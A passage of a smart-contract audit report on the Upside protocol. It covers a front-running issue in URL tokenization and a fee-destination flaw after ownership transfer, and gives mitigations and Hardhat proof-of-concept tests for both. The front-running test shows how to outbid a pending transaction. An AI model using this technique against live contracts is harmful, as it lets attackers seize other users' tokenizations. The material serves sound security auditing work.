<h3 style="position:relative;" id="impact"><a class="anchor before" aria-label="impact permalink" href="#impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Attackers can steal high-value URLs (e.g., popular brand names).</p>
<h3 style="position:relative;" id="recommended-mitigation-steps"><a class="anchor before" aria-label="recommended mitigation steps permalink" href="#recommended-mitigation-steps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Require users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.</p>
<h3 style="position:relative;" id="proof-of-concept"><a class="anchor before" aria-label="proof of concept permalink" href="#proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In PoC.test.ts, make the following modification:</li>
</ol>
<pre data-index="2" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // Add this import</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in the same file:</li>
</ol>
<pre data-index="3" data-language="typescript" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">"Should permit user2 to execute transactions ahead of user1"</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">url1</span><span class="mtk1"> = </span><span class="mtk8">"https://example1.com"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">liquidityToken</span><span class="mtk1">.</span><span class="mtk11">getAddress</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">.</span><span class="mtk11">getAddress</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Fee configuration</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">newFeeInfo</span><span class="mtk1"> = {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">tokenizeFeeEnabled:</span><span class="mtk1"> </span><span class="mtk4">true</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">tokenizeFeeDestinationAddress:</span><span class="mtk1"> </span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeStartingBp:</span><span class="mtk1"> </span><span class="mtk7">9900</span><span class="mtk1">,  </span><span class="mtk3">// 99%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDecayBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,      </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDecayInterval:</span><span class="mtk1"> </span><span class="mtk7">6</span><span class="mtk1">,  </span><span class="mtk3">// 6 seconds</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeFinalBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,      </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDeployerBp:</span><span class="mtk1"> </span><span class="mtk7">1000</span><span class="mtk1">,  </span><span class="mtk3">// 10%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeSellBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,       </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    };</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Set fee info</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">).</span><span class="mtk11">setFeeInfo</span><span class="mtk1">(</span><span class="mtk12">newFeeInfo</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Turn off auto-mining to simulate pending transactions in the mempool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_setAutomine"</span><span class="mtk1">, [</span><span class="mtk4">false</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// User1 submits a transaction with normal gas fees</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">user1Tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">tokenize</span><span class="mtk1">(</span><span class="mtk12">url1</span><span class="mtk1">, </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1">, {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">gasPrice:</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">"10"</span><span class="mtk1">, </span><span class="mtk8">"gwei"</span><span class="mtk1">), </span><span class="mtk3">// Low priority</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// User2 submits the same transcation with higher gas price to front-run</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">user2Tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">).</span><span class="mtk11">tokenize</span><span class="mtk1">(</span><span class="mtk12">url1</span><span class="mtk1">, </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1">, {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">gasPrice:</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">"100"</span><span class="mtk1">, </span><span class="mtk8">"gwei"</span><span class="mtk1">), </span><span class="mtk3">// High priority</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Mine the transactions, user2's should be prioritized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_mine"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Reactivate auto-mining for normal operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_setAutomine"</span><span class="mtk1">, [</span><span class="mtk4">true</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Verify that user1's transaction failed because the URL was already tokenized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">user1Tx</span><span class="mtk1">.</span><span class="mtk11">wait</span><span class="mtk1">()).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">be</span><span class="mtk1">.</span><span class="mtk11">revertedWithCustomError</span><span class="mtk1">(</span><span class="mtk12">upsideProtocol</span><span class="mtk1">, </span><span class="mtk8">"MetaCoinExists"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }).</span><span class="mtk11">timeout</span><span class="mtk1">(</span><span class="mtk7">100000000</span><span class="mtk1">);</span></span></span></code></pre>
<h2 style="position:relative;" id="02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner"><a class="anchor before" aria-label="02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink" href="#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[02] Transferring ownership may result in fees being unintentionally paid to the previous owner</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353</a></p>
<h3 style="position:relative;" id="finding-description-and-impact"><a class="anchor before" aria-label="finding description and impact permalink" href="#finding-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the protocol, the <code>tokenizeFeeDestinationAddress</code> is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the <code>owner</code> of the contract using a function <code>setFeeInfo</code>.</p>
<pre data-index="4" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setFeeInfo</span><span class="mtk1">(</span><span class="mtk12">FeeInfo</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> ( </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDeployerBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDecayBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeFinalBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> || </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeStartingBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeSellBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&gt;&gt;          </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeStartingBp</span><span class="mtk1"> &lt; </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeFinalBp</span><span class="mtk1"> || </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDecayInterval</span><span class="mtk1"> == </span><span class="mtk7">0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">InvalidSetting</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">feeInfo</span><span class="mtk1"> = </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">FeeInfoSet</span><span class="mtk1">(</span><span class="mtk12">_newFeeInfo</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, when ownership of the contract is transferred using the standard <code>Ownable</code> pattern (e.g., via <code>transferOwnership()</code>), the <code>tokenizeFeeDestinationAddress</code> does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call <code>setFeeInfo</code>, then fees are still sent to the previous owner.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-1"><a class="anchor before" aria-label="recommended mitigation steps 1 permalink" href="#recommended-mitigation-steps-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Override the <code>transferOwnership()</code> from <code>Ownable</code> to check that if the current fee recipient is the owner trying to exit, then it should revert.</p>
<h3 style="position:relative;" id="proof-of-concept-1"><a class="anchor before" aria-label="proof of concept 1 permalink" href="#proof-of-concept-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In <code>PoC.test.ts</code>, make the following modification:</li>
</ol>
<pre data-index="5" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    describe("C4 PoC Test Suite", function () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        let user1: HardhatEthersSigner;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       let user2: HardhatEthersSigner;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        before(async function () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            signers = await hhethers.getSigners();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            owner = signers[2];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            user1 = signers[0];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+           user2 = signers[1];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       // the test below goes here</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in the same file:</li>
</ol>
<pre data-index="6" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it("should send fees to original owner", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const url1 = "https://openzeppelin.com";</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const url2 = "https://cantina.com";</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const liquidityTokenAddress = await liquidityToken.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenizeFeeDestinationAddress = await owner.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _mintAmount = hhethers.parseUnits("100", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _feeAmount = hhethers.parseUnits("5", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Configure fee parameters with current owner as the fee destination</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const newFeeInfo = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeEnabled: true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeStartingBp: 9900,  // 99%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayInterval: 6,  // 6 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeFinalBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDeployerBp: 1000,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeSellBp: 100,       // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Owner sets the fee configuration</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // set tokenize fee to 5e6</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // mint liquidityToken to user1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.mint(await user1.getAddress(), _mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that user1 received the minted tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // user1 performs tokenization (url1), fee should go to current fee destination (owner)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Validate that the fee was received by the original owner</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits("5", 6));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Transfer ownership to user2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // asset that new ownership is assigned to user2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // user1 performs a second tokenization (url2) after ownership transfer</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that the original owner still receives the fee post-ownership transfer</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits("10", 6));</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
